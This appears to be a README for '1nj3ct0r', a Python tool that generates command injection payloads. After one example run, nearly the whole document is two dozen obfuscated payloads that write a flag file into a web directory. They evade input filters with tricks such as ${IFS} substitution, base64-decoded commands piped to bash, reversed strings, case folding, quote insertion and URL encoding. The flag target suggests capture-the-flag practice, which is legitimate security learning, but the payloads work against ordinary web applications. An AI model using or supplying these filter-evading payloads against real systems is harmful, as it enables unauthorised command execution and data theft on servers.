# 1nj3ct0r
This is a Command Injection payload generator made with Python 3

Example:
python3 cmd_injection_gen.py "cat /flag.txt >> /var/www/html/filefolder/somefile.txt"

[!] Generating payloads for [cat /flag.txt >> /var/www/html/filefolder/somefile.txt]
[+] Saving payloads payloads.
%3b$(a="CaT${IFS}${PATH:0:1}FlAg.tXt${IFS}>>${IFS}${PATH:0:1}vAr${PATH:0:1}wWw${PATH:0:1}hTmL${PATH:0:1}FiLeFoLdEr${PATH:0:1}sOmEfIlE.TxT"${LS_COLORS:10:1}printf${IFS}%s${IFS}"${a,,}")
%0a$(rev<<<'t\x\t\.\e\l\i\f\e\m\o\s\/\r\e\d\l\o\f\e\l\i\f\/\l\m\t\h\/\w\w\w\/\r\a\v\/\  \>\>\   \t\x\t\.\g\a\l\f\/\     \t\a\c')
%26%26bash%3C%3C%3C%24%28base64%09-d%3C%3C%3CY1xhXHRcIFwvXGZcbFxhXGdcLlx0XHhcdFwgXD5cPlwgXC9cdlxhXHJcL1x3XHdcd1wvXGhcdFxtXGxcL1xmXGlcbFxlXGZcb1xsXGRcZVxyXC9cc1xvXG1cZVxmXGlcbFxlXC5cdFx4XHQ%3D%29
$(cat${IFS}/flag.txt${IFS}>>${IFS}/var/www/html/filefolder/somefile.txt)
%7cc%24%40a%24%40t%24%40%09%24%40%2F%24%40f%24%40l%24%40a%24%40g%24%40.%24%40t%24%40x%24%40t%24%40%09%24%40%3E%24%40%3E%24%40%09%24%40%2F%24%40v%24%40a%24%40r%24%40%2F%24%40w%24%40w%24%40w%24%40%2F%24%40h%24%40t%24%40m%24%40l%24%40%2F%24%40f%24%40i%24%40l%24%40e%24%40f%24%40o%24%40l%24%40d%24%40e%24%40r%24%40%2F%24%40s%24%40o%24%40m%24%40e%24%40f%24%40i%24%40l%24%40e%24%40.%24%40t%24%40x%24%40t
%0a%24%28rev%3C%3C%3C%27t%40%24x%40%24t%40%24.%40%24e%40%24l%40%24i%40%24f%40%24e%40%24m%40%24o%40%24s%40%24/%40%24r%40%24e%40%24d%40%24l%40%24o%40%24f%40%24e%40%24l%40%24i%40%24f%40%24/%40%24l%40%24m%40%24t%40%24h%40%24/%40%24w%40%24w%40%24w%40%24/%40%24r%40%24a%40%24v%40%24/%40%24%20%40%24%3E%40%24%3E%40%24%20%40%24t%40%24x%40%24t%40%24.%40%24g%40%24a%40%24l%40%24f%40%24/%40%24%20%40%24t%40%24a%40%24c%27%29
%3bbash<<<$(base64${IFS}-d<<<Y2F0IC9mbGFnLnR4dCA+PiAvdmFyL3d3dy9odG1sL2ZpbGVmb2xkZXIvc29tZWZpbGUudHh0)
%26c'a't${IFS}${PATH:0:1}f'l'ag.t'x't${IFS}>>${IFS}${PATH:0:1}v'a'r${PATH:0:1}'w''w''w'${PATH:0:1}h't'ml${PATH:0:1}f'i'lefolder${PATH:0:1}s'o'mefile.t'x't
%26bash%3C%3C%3C%24%28base64+-d%3C%3C%3CY2F0IC9mbGFnLnR4dCA%2BPiAvdmFyL3d3dy9odG1sL2ZpbGVmb2xkZXIvc29tZWZpbGUudHh0%29
%0a%7Bcat%2C%2Fflag.txt%2C%3E%3E%2C%2Fvar%2Fwww%2Fhtml%2Ffilefolder%2Fsomefile.txt%7D
%24%28c%24%40a%24%40t%24%40%20%24%40/%24%40f%24%40l%24%40a%24%40g%24%40.%24%40t%24%40x%24%40t%24%40%20%24%40%3E%24%40%3E%24%40%20%24%40/%24%40v%24%40a%24%40r%24%40/%24%40w%24%40w%24%40w%24%40/%24%40h%24%40t%24%40m%24%40l%24%40/%24%40f%24%40i%24%40l%24%40e%24%40f%24%40o%24%40l%24%40d%24%40e%24%40r%24%40/%24%40s%24%40o%24%40m%24%40e%24%40f%24%40i%24%40l%24%40e%24%40.%24%40t%24%40x%24%40t%29
%0a$(cat        /flag.txt       >>      /var/www/html/filefolder/somefile.txt)
%24%28c%5Ca%5Ct%5C%20%5C/%5Cf%5Cl%5Ca%5Cg%5C.%5Ct%5Cx%5Ct%5C%20%5C%3E%5C%3E%5C%20%5C/%5Cv%5Ca%5Cr%5C/%5Cw%5Cw%5Cw%5C/%5Ch%5Ct%5Cm%5Cl%5C/%5Cf%5Ci%5Cl%5Ce%5Cf%5Co%5Cl%5Cd%5Ce%5Cr%5C/%5Cs%5Co%5Cm%5Ce%5Cf%5Ci%5Cl%5Ce%5C.%5Ct%5Cx%5Ct%29
%7cc%5Ca%5Ct%5C%09%5C/%5Cf%5Cl%5Ca%5Cg%5C.%5Ct%5Cx%5Ct%5C%09%5C%3E%5C%3E%5C%09%5C/%5Cv%5Ca%5Cr%5C/%5Cw%5Cw%5Cw%5C/%5Ch%5Ct%5Cm%5Cl%5C/%5Cf%5Ci%5Cl%5Ce%5Cf%5Co%5Cl%5Cd%5Ce%5Cr%5C/%5Cs%5Co%5Cm%5Ce%5Cf%5Ci%5Cl%5Ce%5C.%5Ct%5Cx%5Ct
-azertyuiopmlkjhgfdsqwxcbn0123456789%7c%7cbash<<<$(base64 -d<<<YyRAYSRAdCRAICRALyRAZiRAbCRAYSRAZyRALiRAdCRAeCRAdCRAICRAPiRAPiRAICRALyRAdiRAYSRAciRALyRAdyRAdyRAdyRALyRAaCRAdCRAbSRAbCRALyRAZiRAaSRAbCRAZSRAZiRAbyRAbCRAZCRAZSRAciRALyRAcyRAbyRAbSRAZSRAZiRAaSRAbCRAZSRALiRAdCRAeCRAdA==)
-azertyuiopmlkjhgfdsqwxcbn0123456789%7c%7c$(tr${IFS}"[A-Z]"${IFS}"[a-z]"<<<"CaT${IFS}${PATH:0:1}FlAg.tXt${IFS}>>${IFS}${PATH:0:1}vAr${PATH:0:1}wWw${PATH:0:1}hTmL${PATH:0:1}FiLeFoLdEr${PATH:0:1}sOmEfIlE.TxT")
%26%26$(a="CaT${IFS}/fLaG.TxT${IFS}>>${IFS}/VaR/WwW/HtMl/fIlEfOlDeR/SoMeFiLe.tXt";printf${IFS}%s${IFS}"${a,,}")
%0a%24%28tr%24%7BIFS%7D%22%5BA-Z%5D%22%24%7BIFS%7D%22%5Ba-z%5D%22%3C%3C%3C%22CaT%24%7BIFS%7D/FlAg.tXt%24%7BIFS%7D%3E%3E%24%7BIFS%7D/vAr/wWw/hTmL/FiLeFoLdEr/sOmEfIlE.TxT%22%29
%3b$(rev<<<'t@$x@$t@$.@$e@$l@$i@$f@$e@$m@$o@$s@$${PATH:0:1}@$r@$e@$d@$l@$o@$f@$e@$l@$i@$f@$${PATH:0:1}@$l@$m@$t@$h@$${PATH:0:1}@$w@$w@$w@$${PATH:0:1}@$r@$a@$v@$${PATH:0:1}@$ @$>@$>@$ @$t@$x@$t@$.@$g@$a@$l@$f@$${PATH:0:1}@$ @$t@$a@$c')
%0ac$@a$@t$@    $@/$@f$@l$@a$@g$@.$@t$@x$@t$@   $@>$@>$@        $@/$@v$@a$@r$@/$@w$@w$@w$@/$@h$@t$@m$@l$@/$@f$@i$@l$@e$@f$@o$@l$@d$@e$@r$@/$@s$@o$@m$@e$@f$@i$@l$@e$@.$@t$@x$@t
%7cbash<<<$(base64${IFS}-d<<<Y1xhXHRcIFwvXGZcbFxhXGdcLlx0XHhcdFwgXD5cPlwgXC9cdlxhXHJcL1x3XHdcd1wvXGhcdFxtXGxcL1xmXGlcbFxlXGZcb1xsXGRcZVxyXC9cc1xvXG1cZVxmXGlcbFxlXC5cdFx4XHQ=)
%26%26c%22a%22t+%2Ff%22l%22ag.t%22x%22t+%3E%3E+%2Fv%22a%22r%2F%22w%22%22w%22%22w%22%2Fh%22t%22ml%2Ff%22i%22lefolder%2Fs%22o%22mefile.t%22x%22t
%26%26%24%28rev%3C%3C%3C%27t%40%24x%40%24t%40%24.%40%24e%40%24l%40%24i%40%24f%40%24e%40%24m%40%24o%40%24s%40%24/%40%24r%40%24e%40%24d%40%24l%40%24o%40%24f%40%24e%40%24l%40%24i%40%24f%40%24/%40%24l%40%24m%40%24t%40%24h%40%24/%40%24w%40%24w%40%24w%40%24/%40%24r%40%24a%40%24v%40%24/%40%24%20%40%24%3E%40%24%3E%40%24%20%40%24t%40%24x%40%24t%40%24.%40%24g%40%24a%40%24l%40%24f%40%24/%40%24%20%40%24t%40%24a%40%24c%27%29
